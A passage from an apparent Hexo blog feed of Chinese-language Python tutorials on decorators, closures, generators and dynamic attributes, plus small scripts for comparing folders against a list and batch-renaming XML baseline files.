self.init_window_name.geometry(self.size)</span><br><span class="line"></span><br><span class="line">    def startPath(self):</span><br><span class="line">        self.path_start = askdirectory()</span><br><span class="line">        self.start_path.set(self.path_start)</span><br><span class="line"></span><br><span class="line">    def set_init_window(self):</span><br><span class="line">        self.init_data_label = Label(self.init_window_name,text = &quot;选择对比路径:&quot;)</span><br><span class="line">        self.init_data_label.grid(row = 0, column = 0)</span><br><span class="line">        self.init_data_entry = Entry(self.init_window_name, textvariable = self.start_path, width=41)</span><br><span class="line">        self.init_data_entry.grid(row = 0, column = 1)</span><br><span class="line">        self.init_data_button = Button(self.init_window_name, text = &quot;选择文件夹&quot;, width=10,command = self.startPath)</span><br><span class="line">        self.init_data_button.grid(row = 0, column = 2)</span><br><span class="line"></span><br><span class="line">        self.log_label = Label(self.init_window_name, text=&quot;详细输出日志：&quot;)</span><br><span class="line">        self.log_label.grid(row=2, column=0)</span><br><span class="line">        self.log_label = Text(self.init_window_name, width=65, height=19)</span><br><span class="line">        self.log_label.grid(row=13, column=0, columnspan=10)</span><br><span class="line">        self.result_data_scrollbar_y = Scrollbar(self.init_window_name)</span><br><span class="line">        self.result_data_scrollbar_y.config(command=self.log_label.yview)</span><br><span class="line">        self.log_label.config(yscrollcommand=self.result_data_scrollbar_y.set)</span><br><span class="line">        self.result_data_scrollbar_y.grid(row=3, column=10, rowspan=18, sticky=&apos;NS&apos;)</span><br><span class="line">        self.export_log = Button(self.init_window_name, text=&quot;开始查找&quot;, width=10,command=self.main)</span><br><span class="line">        self.export_log.grid(row=2, column=2)</span><br><span class="line"></span><br><span class="line">    def main(self):</span><br><span class="line">        excel_list = []</span><br><span class="line">        folder_list = []</span><br><span class="line"></span><br><span class="line">        folder_start = self.path_start</span><br><span class="line"></span><br><span class="line">        with open(&apos;excel.txt&apos;) as lists:</span><br><span class="line">            for content in lists:</span><br><span class="line">                content = content.strip(&apos;\n\r&apos;)</span><br><span class="line">                excel_list.append(content)</span><br><span class="line"></span><br><span class="line">        dirList = os.listdir(folder_start)</span><br><span class="line">        for content in dirList:</span><br><span class="line">            folder_list.append(content)</span><br><span class="line"></span><br><span class="line">        x = 0</span><br><span class="line">        os.mkdir(folder_start+&apos;\\&apos; + &apos;缺&apos;)</span><br><span class="line">        for excel_txt in excel_list:</span><br><span class="line">            for folder_txt in folder_list:</span><br><span class="line">                if excel_txt == folder_txt:</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                try:</span><br><span class="line">                    os.mkdir(folder_start+&apos;\\缺\\&apos; + excel_txt)</span><br><span class="line">                    self.write_log_to_Text(&apos;缺少证明材料：%s&apos;%excel_txt)</span><br><span class="line">                    x += 1</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">        i = 0</span><br><span class="line">        os.mkdir(folder_start+&apos;\\&apos; + &apos;多余材料&apos;)</span><br><span class="line">        for folder_txt in folder_list:</span><br><span class="line">            for excel_txt in excel_list:</span><br><span class="line">                if folder_txt == excel_txt:</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                try:</span><br><span class="line">                    start = folder_start+&apos;\\&apos; + folder_txt</span><br><span class="line">                    end = folder_start+&apos;\\多余材料\\&apos; + folder_txt</span><br><span class="line">                    self.write_log_to_Text(&apos;多余证明材料：%s&apos;%folder_txt)</span><br><span class="line">                    i += 1</span><br><span class="line">                    shutil.move(start,end)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">        self.write_log_to_Text(&apos;对比完成，缺少证明材料%s个，多余证明材料%s个。&apos;%(x,i))</span><br><span class="line"></span><br><span class="line">    def get_current_time(self):</span><br><span class="line">        current_time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))</span><br><span class="line">        return current_time</span><br><span class="line">        </span><br><span class="line">    def write_log_to_Text(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        current_time = self.get_current_time()</span><br><span class="line">        logmsg_in = str(current_time) +&quot; &quot; + str(logmsg) + &quot;\n&quot;</span><br><span class="line">        self.log_label.insert(END, logmsg_in)</span><br><span class="line">        self.log_label.update()</span><br><span class="line">        self.log_label.see(END)</span><br><span class="line">        LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line"></span><br><span class="line">def gui_start():</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ZMJ_PORTAL = RSAS_GUI(init_window)</span><br><span class="line">    ZMJ_PORTAL.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    LOG_LINE_NUM = 0</span><br><span class="line">    gui_start()</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 动态语言</title>
      <link href="/article/python-action-scope.html"/>
      <url>/article/python-action-scope.html</url>
      
        <content type="html"><![CDATA[<h3 id="给对象添加属性"><a href="#给对象添加属性" class="headerlink" title="给对象添加属性"></a>给对象添加属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    def __init__(self, newName, newAge):</span><br><span class="line">        self.name = newName</span><br><span class="line">        self.age = newAge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">laowang = Person(&quot;老王&quot;, 10000)</span><br><span class="line">print(laowang.name)</span><br><span class="line">print(laowang.age)</span><br><span class="line">laowang.addr = &quot;北京....&quot;</span><br><span class="line">print(laowang.addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">laozhao = Person(&quot;老赵&quot;, 18)</span><br><span class="line"># print(laozhao.addr)</span><br><span class="line"></span><br><span class="line">Person.num = 100</span><br><span class="line">print(laowang.num)</span><br><span class="line">print(laozhao.num)</span><br></pre></td></tr></table></figure><h3 id="给对象添加方法"><a href="#给对象添加方法" class="headerlink" title="给对象添加方法"></a>给对象添加方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line"></span><br><span class="line">class Person(object):</span><br><span class="line">    def __init__(self, newName):</span><br><span class="line">        self.name = newName</span><br><span class="line"></span><br><span class="line">def get(self):</span><br><span class="line">    print(&apos;%s嗯啊啦啦啦！&apos;%self.name)</span><br><span class="line"></span><br><span class="line">Person = Person(&apos;嗯&apos;)</span><br><span class="line"></span><br><span class="line">Person.get = types.MethodType(get,Person)</span><br><span class="line">Person.get()</span><br><span class="line"></span><br><span class="line">addr = types.MethodType(get,Person)</span><br><span class="line">addr()</span><br></pre></td></tr></table></figure><h3 id="静态方法添加属性"><a href="#静态方法添加属性" class="headerlink" title="静态方法添加属性"></a>静态方法添加属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    def __init__(self, newName):</span><br><span class="line">        self.name = newName</span><br><span class="line"></span><br><span class="line">def get():</span><br><span class="line">    print(&apos;嗯啊啦啦啦！&apos;)</span><br><span class="line"></span><br><span class="line">Person = Person(&apos;嗯&apos;)</span><br><span class="line"></span><br><span class="line">Person.get = get</span><br><span class="line">Person.get()</span><br></pre></td></tr></table></figure><h3 id="slots"><a href="#slots" class="headerlink" title="slots"></a>slots</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    #限制添加额外的属性,只能有name、age两个属性</span><br><span class="line">    __slots__(name, age):</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 装饰器</title>
      <link href="/article/python-high-ranking-decorators.html"/>
      <url>/article/python-high-ranking-decorators.html</url>
      
        <content type="html"><![CDATA[<p>嗯？？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def test(func):</span><br><span class="line">    def inner():</span><br><span class="line">        print(&quot;---正在验证权限----&quot;)</span><br><span class="line">        func()</span><br><span class="line">    return inner</span><br><span class="line"></span><br><span class="line">def f1():</span><br><span class="line">    print(&quot;---f1---&quot;)</span><br><span class="line"></span><br><span class="line">def f2():</span><br><span class="line">    print(&quot;---f2---&quot;)</span><br><span class="line"></span><br><span class="line">#innerFunc = w1(f1)</span><br><span class="line">#innerFunc()</span><br><span class="line"></span><br><span class="line">f1 = w1(f1)</span><br><span class="line">f1()</span><br></pre></td></tr></table></figure><p>嗯…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def w1(func):</span><br><span class="line">    def inner():</span><br><span class="line">        print(&quot;---正在验证权限----&quot;)</span><br><span class="line">        if False:</span><br><span class="line">            func()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;没有权限&quot;)</span><br><span class="line">    return inner</span><br><span class="line"></span><br><span class="line">@w1</span><br><span class="line">def f1():</span><br><span class="line">    print(&quot;---f1---&quot;)</span><br><span class="line"></span><br><span class="line">@w1</span><br><span class="line">def f2():</span><br><span class="line">    print(&quot;---f2---&quot;)</span><br><span class="line"></span><br><span class="line">f1()</span><br><span class="line">f2()</span><br></pre></td></tr></table></figure><p>嗯？？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def w1(func):</span><br><span class="line">    print(&quot;---正在装饰1----&quot;)</span><br><span class="line">    def inner():</span><br><span class="line">        print(&quot;---正在验证权限1----&quot;)</span><br><span class="line">        func()</span><br><span class="line">    return inner</span><br><span class="line"></span><br><span class="line">def w2(func):</span><br><span class="line">    print(&quot;---正在装饰2----&quot;)</span><br><span class="line">    def inner():</span><br><span class="line">        print(&quot;---正在验证权限2----&quot;)</span><br><span class="line">        func()</span><br><span class="line">    return inner</span><br><span class="line"></span><br><span class="line">#只要python解释器执行到了这个代码,那么就会自动的进行装饰,而不是等到调用的时候才装饰的</span><br><span class="line">@w1</span><br><span class="line">@w2</span><br><span class="line">def f1():</span><br><span class="line">    print(&quot;---f1---&quot;)</span><br><span class="line"></span><br><span class="line">#在调用f1之前,已经进行装饰了</span><br><span class="line">f1()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---正在装饰2----</span><br><span class="line">---正在装饰1----</span><br><span class="line">---正在验证权限1----</span><br><span class="line">---正在验证权限2----</span><br><span class="line">---f1---</span><br></pre></td></tr></table></figure><h3 id="有参数"><a href="#有参数" class="headerlink" title="有参数"></a>有参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def func(functionName):</span><br><span class="line">    print(&quot;---func---1---&quot;)</span><br><span class="line">    def func_in(a, b):#如果a,b 没有定义,那么会导致16行的调用失败</span><br><span class="line">        print(&quot;---func_in---1---&quot;)</span><br><span class="line">        functionName(a, b)#如果没有把a,b当做实参进行传递,那么会导致调用12行的函数失败</span><br><span class="line">        print(&quot;---func_in---2---&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;---func---2---&quot;)</span><br><span class="line">    return func_in</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test(a, b):</span><br><span class="line">    print(&quot;----test-a=%d,b=%d---&quot;%(a,b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test(11,22)</span><br></pre></td></tr></table></figure><h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def func(functionName):</span><br><span class="line">    print(&quot;---func---1---&quot;)</span><br><span class="line">    def func_in(*args, **kwargs):#采用不定长参数的方式满足所有函数需要参数以及不需要参数的情况</span><br><span class="line">        print(&quot;---func_in---1---&quot;)</span><br><span class="line">        functionName(*args, **kwargs)#这个地方,需要写*以及**,如果不写的话,那么args是元祖,而kwargs是字典</span><br><span class="line">        print(&quot;---func_in---2---&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;---func---2---&quot;)</span><br><span class="line">    return func_in</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test(a, b, c):</span><br><span class="line">    print(&quot;----test-a=%d,b=%d,c=%d---&quot;%(a,b,c))</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test2(a, b, c, d):</span><br><span class="line">    print(&quot;----test-a=%d,b=%d,c=%d,d=%d---&quot;%(a,b,c,d))</span><br><span class="line"></span><br><span class="line">test(11,22,33)</span><br><span class="line"></span><br><span class="line">test2(44,55,66,77)</span><br></pre></td></tr></table></figure><h3 id="返回值装饰"><a href="#返回值装饰" class="headerlink" title="返回值装饰"></a>返回值装饰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def func(functionName):</span><br><span class="line">    print(&quot;---func---1---&quot;)</span><br><span class="line">    def func_in():</span><br><span class="line">        print(&quot;---func_in---1---&quot;)</span><br><span class="line">        ret = functionName() #保存 返回来的haha</span><br><span class="line">        print(&quot;---func_in---2---&quot;)</span><br><span class="line">        return ret #把haha返回给17行处的调用</span><br><span class="line"></span><br><span class="line">    print(&quot;---func---2---&quot;)</span><br><span class="line">    return func_in</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test():</span><br><span class="line">    print(&quot;----test----&quot;)</span><br><span class="line">    return &quot;haha&quot;</span><br><span class="line"></span><br><span class="line">ret = test()</span><br><span class="line">print(&quot;test return value is %s&quot;%ret)</span><br></pre></td></tr></table></figure><h3 id="通用装饰器"><a href="#通用装饰器" class="headerlink" title="通用装饰器"></a>通用装饰器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def func(functionName):</span><br><span class="line">    def func_in(*args, **kwargs):</span><br><span class="line">        print(&quot;-----记录日志-----&quot;)</span><br><span class="line">        ret = functionName(*args, **kwargs)</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    return func_in</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test():</span><br><span class="line">    print(&quot;----test----&quot;)</span><br><span class="line">    return &quot;haha&quot;</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test2():</span><br><span class="line">    print(&quot;----test2---&quot;)</span><br><span class="line"></span><br><span class="line">@func</span><br><span class="line">def test3(a):</span><br><span class="line">    print(&quot;-----test3--a=%d--&quot;%a)</span><br><span class="line"></span><br><span class="line">ret = test()</span><br><span class="line">print(&quot;test return value is %s&quot;%ret)</span><br><span class="line"></span><br><span class="line">a = test2()</span><br><span class="line">print(&quot;test2 return value is %s&quot;%a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test3(11)</span><br></pre></td></tr></table></figure><h3 id="带参数的装饰器"><a href="#带参数的装饰器" class="headerlink" title="带参数的装饰器"></a>带参数的装饰器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def func_arg(arg):</span><br><span class="line">    def func(functionName):</span><br><span class="line">        def func_in():</span><br><span class="line">            print(&quot;---记录日志-arg=%s--&quot;%arg)</span><br><span class="line">            if arg==&quot;heihei&quot;:</span><br><span class="line">                functionName()</span><br><span class="line">                functionName()</span><br><span class="line">            else:</span><br><span class="line">                functionName()</span><br><span class="line">        return func_in</span><br><span class="line">    return func</span><br><span class="line"></span><br><span class="line">#1. 先执行func_arg(&quot;heihei&quot;)函数,这个函数return 的结果是func这个函数的引用</span><br><span class="line">#2. @func</span><br><span class="line">#3. 使用@func对test进行装饰</span><br><span class="line">@func_arg(&quot;heihei&quot;)</span><br><span class="line">def test():</span><br><span class="line">    print(&quot;--test--&quot;)</span><br><span class="line"></span><br><span class="line">#带有参数的装饰器,能够起到在运行时,有不同的功能</span><br><span class="line">@func_arg(&quot;haha&quot;)</span><br><span class="line">def test2():</span><br><span class="line">    print(&quot;--test2--&quot;)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">test2()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 闭包</title>
      <link href="/article/python-high-ranking-closure.html"/>
      <url>/article/python-high-ranking-closure.html</url>
      
        <content type="html"><![CDATA[<h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>在一个函数里边在定义一个函数，并且定义的函数调用了外部函数的参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def test(number):</span><br><span class="line"></span><br><span class="line">    def closure():</span><br><span class="line">        print(number+100)</span><br><span class="line">    return closure</span><br><span class="line"></span><br><span class="line">data = test(100)</span><br><span class="line">data()</span><br></pre></td></tr></table></figure><h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><p>程序自上而下执行，当执行到定义的函数后不做任何操作，直到函数的调用，调用函数并自上而下执行，当执行到了函数内定义的函数，不做任何操作，直接返回该函数的引用。该函数又重新赋值给另外一个变量，这个变量就相当于函数体，可以任意的调用并传参。</p><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>看起来有点意思：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def test(x,y):</span><br><span class="line"></span><br><span class="line">    def closure(i):</span><br><span class="line">        print(x*i+y)</span><br><span class="line">    return closure</span><br><span class="line"></span><br><span class="line">data = test(1,1)</span><br><span class="line">data(0)</span><br><span class="line">data(5)</span><br><span class="line">data(10)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 基线脚本批量重命名</title>
      <link href="/article/refuse-xml-rename.html"/>
      <url>/article/refuse-xml-rename.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class Folder_re(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(Folder_re, self).__init__()</span><br><span class="line">        self.file_re = &apos;.*?.xml&apos;</span><br><span class="line">        self.uuid_re = &apos;&lt;result uuid= &quot;(.*?)&quot; ip=&quot;.*?&quot;&gt;&apos;</span><br><span class="line"></span><br><span class="line">folder_start = sys.argv[1]</span><br><span class="line">dirList = os.listdir(folder_start)</span><br><span class="line">for name in dirList:</span><br><span class="line">    all_file_name = re.findall(Folder_re().file_re,name)</span><br><span class="line">    for file_name in all_file_name:</span><br><span class="line">        file = folder_start+&apos;\\&apos;+file_name</span><br><span class="line">        with open(file,encoding=&quot;utf-8&quot;) as content:</span><br><span class="line">            info = content.read()</span><br><span class="line">            content.close()</span><br><span class="line">            uuid = re.findall(Folder_re().uuid_re,info,re.S|re.M)</span><br><span class="line">            if uuid:</span><br><span class="line">                option = file.rfind(&apos;.&apos;)</span><br><span class="line">                os.rename(file,file[0:option]+&apos;_%s_chk&apos; % uuid[0] +file[option:])</span><br><span class="line">                print(file,&apos;======&gt;&apos;,file[0:option]+&apos;_%s_chk&apos; % uuid[0] +file[option:])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 生成器、迭代器</title>
      <link href="/article/python-high-ranking.html"/>
      <url>/article/python-high-ranking.html</url>
      
        <content type="html"><![CDATA[<h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = (x for x in range(1,10))</span><br><span class="line">&gt;&gt;&gt; next(a)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(a)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; next(a)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; next(a)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(a)</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def creatNum():</span><br><span class="line">    a,b = 0,1</span><br><span class="line">    for i in range(5):</span><br><span class="line">        yield b</span><br><span class="line">        a,b = b,a+b</span><br><span class="line"></span><br><span class="line">t = creatNum()</span><br><span class="line">for x in range(5):</span><br><span class="line">  print(next(t))</span><br><span class="line">  t.send(&apos;11111&apos;)</span><br><span class="line">  print(t.__next__())</span><br><span class="line"></span><br><span class="line">#两种调用方式都是一样的</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def creatNum():</span><br><span class="line">    a,b = 0,1</span><br><span class="line">    for i in range(5):</span><br><span class="line">        yield b</span><br><span class="line">        a,b = b,a+b</span><br><span class="line"></span><br><span class="line">for x in creatNum():</span><br><span class="line">  print(x)</span><br></pre></td></tr></table></figure><p>yield：迭代到下一次的调用时，所使用的参数都是第一次所保留下的，即是说，在整个所有函数调用的参数都是第一次所调用时保留的，而不是新创建的。</p><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><h3 id="可迭代对象"><a href="#可迭代对象" class="headerlink" title="可迭代对象"></a>可迭代对象</h3><p>以直接作用于 for 循环的数据类型有以下几种：</p><p>一类是集合数据类型，如 list 、 tuple 、 dict 、 set 、 str 等；</p><p>一类是 generator ，包括生成器和带 yield 的generator function。</p><p>这些可以直接作用于 for 循环的对象统称为可迭代对象： Iterable 。</p><p>可以使用 isinstance() 判断一个对象是否是 Iterable 对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterable</span><br><span class="line">#判断目标是否可迭代，返回TRUE</span><br><span class="line">&gt;&gt;&gt; print(isinstance(&apos;abc&apos;,Iterable))</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>而生成器不但可以作用于 for 循环，还可以被 next() 函数不断调用并返回下一个值，直到最后抛出 StopIteration 错误表示无法继续返回下一个值了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3,4,5]</span><br></pre></td></tr></table></figure><h3 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h3><p>可以被next()函数调用并不断返回下一个值的对象称为迭代器：Iterator。</p><p>可以使用 isinstance() 判断一个对象是否是 Iterator 对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 